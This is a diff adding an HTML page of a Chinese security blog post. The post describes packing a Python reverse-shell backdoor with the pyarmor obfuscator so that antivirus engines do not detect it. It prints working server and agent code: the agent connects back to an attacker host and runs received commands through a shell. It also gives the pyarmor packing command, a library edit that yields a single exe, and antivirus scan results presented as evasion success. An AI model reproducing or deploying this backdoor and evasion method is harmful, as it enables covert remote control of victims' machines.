@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="zh-cn" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="Lioders" />
+	
+	
+	
+	<title>有趣的python混淆库 ｜ </title>
+	
+    
+    
+    <meta name="description" content="一个有趣的python混淆库 pyarmor · PyPI 前几天由于红队要准备一些东西，找不到免杀的远控，一时也没有思路，想到以前有人用shellcode&amp;lt;python&amp;gt; 打包为exe，可以免杀的效果，但是常规sh" />
+    
+
+    
+    
+    <meta name="keywords" content="Hugo, Lioders" />
+    
+
+	
+    
+    <link rel="shortcut icon" href="http://example.org/images/favicon.ico" />
+
+    <link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/normalize.css" />
+    <link rel="stylesheet" type="text/css" media="screen" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" />
+    <link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/zozo.css" />
+	<link rel="stylesheet" type="text/css" media="screen" href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" />
+    <link rel="stylesheet" type="text/css" media="screen" href="http://example.org/css/highlight.css" />
+
+    
+    
+</head>
+
+<body>
+    <div class="main animate__animated animate__fadeInDown">
+        <div class="nav_container animated fadeInDown">
+    <div class="site_nav" id="site_nav">
+        <ul>
+            
+            <li>
+                <a href="/">Home</a>
+            </li>
+            
+            <li>
+                <a href="/posts/">Archive</a>
+            </li>
+            
+            <li>
+                <a href="/tags/">Tags</a>
+            </li>
+            
+            <li>
+                <a href="/about/">About</a>
+            </li>
+            
+        </ul>
+    </div>
+    <div class="menu_icon">
+        <a id="menu_icon"><i class="ri-menu-line"></i></a>
+    </div>
+</div>
+        <div class="header animated fadeInDown">
+    <div class="site_title_container">
+        <div class="site_title">
+            <h1>
+                <a href="http://example.org/">
+                    <span></span>
+                </a>
+            </h1>
+        </div>
+        <div class="description">
+            <p class="sub_title">lioders &#39;s blog</p>
+            <div class="my_socials">
+                
+                
+                <a href="https://github.com/LiodAir" title="github" target="_blank"><i class="ri-github-fill"></i></a>
+                
+                
+                <a href="http://example.org/index.xml" type="application/rss+xml" title="rss" target="_blank"><i
+                        class="ri-rss-fill"></i></a>
+            </div>
+        </div>
+    </div>
+</div>
+        <div class="content">
+            <div class="post_page">
+                <div class="post animate__animated animate__fadeInDown">
+                    <div class="post_title post_detail_title">
+                        <h2><a href='/posts/%E6%9C%89%E8%B6%A3%E7%9A%84python%E6%B7%B7%E6%B7%86%E5%BA%93/'>有趣的python混淆库</a></h2>
+                        <span class="date">2018.04.30</span>
+                    </div>
+                    <div class="post_content markdown"><h1 id="一个有趣的python混淆库">一个有趣的python混淆库</h1>
+<h2 id="pyarmor--pypihttpspypiorgprojectpyarmor"><a href="https://pypi.org/project/pyarmor/">pyarmor · PyPI</a></h2>
+<p>前几天由于红队要准备一些东西，找不到免杀的远控，一时也没有思路，想到以前有人用shellcode<code>&lt;python&gt;</code> 打包为<code>exe</code>，可以免杀的效果，但是常规shellcode直接打包已经被列入规则库，我想了想从python语言角度上混淆看来下效果，基本常见免杀引擎都可以，满足需求。</p>
+<p><code>pyarmor</code>打包混淆原理，其收费版本混淆无规则，开源免费版本硬编码。
+Pyarmor 加密和保护 Python 源代码的方法和机制 <a href="https://github.com/dashingsoft/pyarmor/blob/master/docs/zh-cn/protect-python-scripts-by-pyarmor.md">pyarmor/protect-python-scripts-by-pyarmor.md at master · dashingsoft/pyarmor · GitHub</a></p>
+<h2 id="准备工作">准备工作</h2>
+<p>一个python tcp服务端和客户端，利用混淆库 打包成windwos exe。</p>
+<h3 id="serverpy-tcp后门例子用的是t00ls的帖子">server.py (tcp后门例子用的是t00ls的帖子)</h3>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># -*- coding: utf-8 -*-</span>
+<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span> <span class="kn">as</span> <span class="nn">sp</span><span class="o">,</span><span class="nn">sys</span>                    <span class="c1"># 导入subprocess，socket模块</span>
+
+<span class="c1"># 1）监听信息</span>
+<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>                                   <span class="c1"># 攻击者地址，通常留空&#39;&#39;</span>
+<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>                              <span class="c1"># 攻击者主机端口</span>
+
+<span class="c1"># 2）套接字部分</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="c1"># 安装套接字</span>
+<span class="n">s</span><span class="o">.</span><span class="n">bind</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>                                  <span class="c1"># 绑定套接字</span>
+<span class="n">s</span><span class="o">.</span><span class="n">listen</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>                                        <span class="c1"># 最大连接数:100</span>
+<span class="n">conn</span><span class="p">,</span><span class="n">addr</span>  <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">accept</span><span class="p">()</span>                              <span class="c1"># 接收客户端连接</span>
+
+<span class="c1"># 3）输出连接信息</span>
+<span class="k">print</span> <span class="s2">&#34;[+] Conection Established from: </span><span class="si">%s</span><span class="s2">&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span>
+                                                     <span class="c1"># 打印攻击者的连接信息</span>
+<span class="c1"># 4）接收输出</span>
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>                                            <span class="c1"># 运行死循环初始化反向的连接</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s2">&#34;#&gt; &#34;</span><span class="p">)</span>                      <span class="c1"># 服务器输入</span>
+    <span class="c1"># 5）if判断-1</span>
+    <span class="k">if</span> <span class="n">command</span> <span class="o">!=</span> <span class="s2">&#34;exit()&#34;</span><span class="p">:</span>                         <span class="c1"># 如果命令不是exit()，那就继续执行</span>
+        <span class="c1"># 6）if判断-2</span>
+        <span class="k">if</span> <span class="n">command</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span><span class="p">:</span> <span class="k">continue</span>                  <span class="c1"># 命令如果为空，循环这个函数</span>
+        <span class="c1"># 7）发送、接收命令</span>
+        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>                          <span class="c1"># 发送命令到客户端</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>                    <span class="c1"># 接收并输出</span>
+        <span class="c1"># 8） 处理接收结果</span>
+        <span class="n">total_size</span> <span class="o">=</span> <span class="nb">long</span><span class="p">(</span><span class="n">result</span><span class="p">[:</span><span class="mi">16</span><span class="p">])</span>              <span class="c1"># 获取返回数据的大小,取出前16位的值</span>
+        <span class="n">result</span> <span class="o">=</span> <span class="n">result</span><span class="p">[</span><span class="mi">16</span><span class="p">:]</span>                        <span class="c1"># 接收数据的结果，取16位之后的值</span>
+        <span class="c1"># 9） 处理数据</span>
+        <span class="k">while</span> <span class="n">total_size</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">):</span>             <span class="c1"># 循环函数</span>
+            <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>                  <span class="c1"># 每次接收1024的数据，如果发送的数据大于现在接收的数据</span>
+            <span class="n">result</span> <span class="o">+=</span> <span class="n">data</span>                          <span class="c1"># 循环接收并且拼接起来</span>
+        <span class="c1"># 10）打印结果过滤换行符</span>
+        <span class="k">print</span> <span class="n">result</span><span class="o">.</span><span class="n">rstrip</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>                   <span class="c1"># 过滤掉换行符</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;exit()&#34;</span><span class="p">)</span>                         <span class="c1"># 发送客户端关闭的消息</span>
+        <span class="k">print</span> <span class="s2">&#34;[+] shell Going Down&#34;</span>                <span class="c1"># 本地退出提示</span>
+        <span class="k">break</span>
+<span class="c1"># 11）出现任何故障关闭套接字</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span> 
+</code></pre></div><h3 id="agentpy">agent.py</h3>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python">
+<span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span><span class="nn">subprocess</span> <span class="kn">as</span> <span class="nn">sp</span><span class="o">,</span><span class="nn">sys</span>                    
+
+
+<span class="n">host</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>                                   
+<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>                          
+
+
+<span class="n">conn</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> 
+<span class="n">conn</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
+
+<span class="k">while</span> <span class="mi">1</span><span class="p">:</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
+
+    <span class="k">if</span> <span class="n">command</span> <span class="o">!=</span> <span class="s2">&#34;exit()&#34;</span><span class="p">:</span>
+        <span class="n">sh</span> <span class="o">=</span> <span class="n">sp</span><span class="o">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">command</span><span class="p">,</span><span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
+                      <span class="n">stdout</span><span class="o">=</span><span class="n">sp</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
+                      <span class="n">stderr</span><span class="o">=</span><span class="n">sp</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span>
+                      <span class="n">stdin</span><span class="o">=</span><span class="n">sp</span><span class="o">.</span><span class="n">PIPE</span><span class="p">)</span>
+
+        <span class="n">out</span><span class="p">,</span><span class="n">err</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">communicate</span><span class="p">()</span>   
+
+        <span class="n">result</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">out</span><span class="p">)</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+
+        <span class="n">length</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">result</span><span class="p">))</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
+
+        <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">length</span> <span class="o">+</span> <span class="n">result</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">break</span>
+
+
+<span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></div><h3 id="pyarmor-打包exe">pyarmor 打包exe</h3>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">pyarmor pack -t PyInstaller project/src/agent.py
+</code></pre></div><blockquote>
+<p>常规情况是直接打包为一个exe文件加一些别的dll库文件，而我们正常渗透是不可能上传这些东西上去的，因此分析了下代码，修改pyarmor某处代码，这样打包生成一个文件。
+pyinstaller 打包成一个文件的原理也不是直接所有打包，他运行时需要释放一个缓存目录，运行程序，因此部分测试时生成的exe文件第一次运行没有成功的也是这个原因。</p>
+</blockquote>
+<h3 id="免杀效果">免杀效果</h3>
+<p>在测试的情况下，尝试使用webshell和正常运行均没有影响，且常见杀毒引擎也是不会拦截的
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/78989ac9.png" alt="78989ac9.png"></p>
+<p>webshell运行情况：
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/6c7318da.png" alt="6c7318da.png"></p>
+<p>杀毒引擎查杀情况（<code>这个IKARUS正常python输出helloworld文件也爆，可能对这种混淆方式做了一些处理</code>）：
+<img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/ef0f6c18.png" alt="ef0f6c18.png"></p>
+<h3 id="使用">使用</h3>
+<blockquote>
+<p>修改pyarmor库某处代码 类似<code>/usr/local/lib/python3.7/site-packages/pyarmor/packer.py</code>  187行 修改为</p>
+</blockquote>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="nv">options</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;-F&#39;</span>, <span class="s1">&#39;-y&#39;</span>, <span class="s1">&#39;--specpath&#39;</span>, project<span class="o">]</span>
+</code></pre></div><p><img src="https://raw.githubusercontent.com/LiodAir/images/master/blog/ddcb3a6e.png" alt="ddcb3a6e.png"></p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">pyarmor pack -t PyInstaller project/src/agent.py
+
+更多使用方法：
+
+</code></pre></div><p><a href="https://github.com/dashingsoft/pyarmor/blob/master/src/examples/README-ZH.md">pyarmor/README-ZH.md at master · dashingsoft/pyarmor · GitHub</a></p>
+<h2 id="引用">引用</h2>
+<p><a href="https://www.t00ls.net/articles-43337.html">https://www.t00ls.net/articles-43337.html</a></p>
+</div>
+                    <div class="post_footer">
+                        
+                        <div class="meta">
+                            <div class="info">
+                                <span class="field tags">
+                                    <i class="ri-stack-line"></i>
+                                    
+                                    <a href="http://example.org/tags/python/">Python</a>
+                                    
+                                    <a href="http://example.org/tags/%E5%85%8D%E6%9D%80/">免杀</a>
+                                    
+                                </span>
+                            </div>
+                        </div>
+                        
+                    </div>
+                </div>
+                
+                
+                <div class="doc_comments"></div>
+                
+            </div>
+        </div>
+    </div>
+    <a id="back_to_top" href="#" class="back_to_top"><i class="ri-arrow-up-s-line"></i></a>
+    <footer class="footer">
+    <div class="powered_by">
+        <a href="https://varkai.com">Designed by VarKai,</a>
+        <a href="http://www.gohugo.io/">Proudly published with Hugo</a>
+    </div>
+
+    <div class="footer_slogan">
+        <span>梦想被扼杀的第一个征候就是抱怨没有时间</span>
+    </div>
+</footer>
+    <script src="http://example.org/js/jquery-3.5.1.min.js"></script>
+<link href="http://example.org/css/fancybox.min.css" rel="stylesheet">
+<script src="http://example.org/js/fancybox.min.js"></script>
+<script src="http://example.org/js/zozo.js"></script>
+
+
+
+
+</body>
+
+</html>
